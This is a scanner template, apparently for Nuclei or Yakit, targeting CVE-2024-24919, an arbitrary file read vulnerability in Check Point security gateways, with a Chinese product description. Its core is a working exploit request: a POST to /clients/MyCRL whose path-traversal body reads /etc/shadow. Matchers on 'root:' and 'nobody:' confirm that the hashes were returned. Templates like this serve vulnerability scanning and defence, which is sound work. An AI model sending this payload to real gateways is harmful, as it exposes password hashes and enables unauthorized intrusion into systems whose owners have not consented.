script_name: Check-Point安全网关任意文件读取漏洞
content:
id: CVE-2024-24919

info:
  name: Check-Point安全网关任意文件读取漏洞
  author: Deans
  severity: high
  description: Check Point Security Gateways 是 Check Point Software 提供的一系列网络安全解决方案。这些解决方案包括下一代防火墙（NGFW）、数据中心安全网关和 AI 驱动的量子网关，旨在为企业提供针对复杂网络威胁的先进防护。它们通过集成的威胁防护、统一的安全管理和策略控制，确保网络、云、移动和端点的安全。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 28b7bc701665a7b71897a5bd178b6b4f

http:
- raw:
  - |-
    @timeout: 30s
    POST /clients/MyCRL HTTP/1.1
    Host: {{Hostname}}
    Content-Length: 39

    aCSHELL/../../../../../../../etc/shadow

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'root:'
    - 'nobody:'
    condition: and
